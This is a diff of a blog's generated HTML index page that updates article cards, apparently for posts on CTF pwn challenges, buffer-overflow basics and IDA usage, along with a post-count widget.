-    <a href="/p/2025bjtuctf-pwn/">
-        
-        
-            <div class="article-image">
-                <img src="/p/2025bjtuctf-pwn/BJTUCTF.90f5cd42e21881be44253e37d54b6795_hu_13bcc8b29ab9b122.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post 2025BJTUCTF-PWN"
-                        
-                        data-hash="md5-kPXNQuIYgb5EJT431UtnlQ==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025BJTUCTF-PWN</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
     <a href="/p/pwn-4/">
         
         
             <div class="article-image">
-                <img src="/p/pwn-4/PWN4.3657bbeb84fdb7f3290e78d3c41b8d4c_hu_d9ba59500c5360b4.png" 
+                <img src="/p/pwn-4/PWN4.4afa5f5bde601dbc35b64aebcb8c25e3_hu_a61ad70f238c03c4.png" 
                         width="250" 
                         height="150" 
                         loading="lazy"
                         alt="Featured image of post PWN-4"
                         
-                        data-hash="md5-Nle764T9t/MpDnjTxBuNTA==">
+                        data-hash="md5-SvpfW95gHbw1tkrry4wl4w==">
                 
             </div>
         
 
         <div class="article-details">
             <h2 class="article-title">PWN-4</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/PWN%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.4c7e57113df2cad9ff15c86e749215fe_hu_f04fdb455264b7b2.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 给PWN新手的溢出魔法入门手册"
+                        
+                        data-hash="md5-TH5XET3yytn/FchudJIV/g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">给PWN新手的溢出魔法入门手册</h2>
         </div>
     </a>
 </article>
@@ -1447,6 +2703,30 @@ ROP、shellcode、栈转移等。</p>
 
         <div class="article-details">
             <h2 class="article-title">PWN-1</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ida%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">
+        
+        
+            <div class="article-image">
+                <img src="/p/ida%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/IDA.24e86f15c02689113058084231ff68da_hu_6a8de3be4381c8e4.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post IDA使用指南"
+                        
+                        data-hash="md5-JOhvFcAmiREwWAhCMf9o2g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">IDA使用指南</h2>
         </div>
     </a>
 </article>
@@ -1574,13 +2854,11 @@ ROP、shellcode、栈转移等。</p>
 
 
 
-
-
         
 <section class="wordcount">
   <div class="wordcount-row">
-    <p>博主发布了19篇文章  ||</p>
-    <p>总共252.71k 字</p>
+    <p>博主发布了18篇文章  ||</p>
+    <p>总共255.51k 字</p>
   </div>
 </section>
         
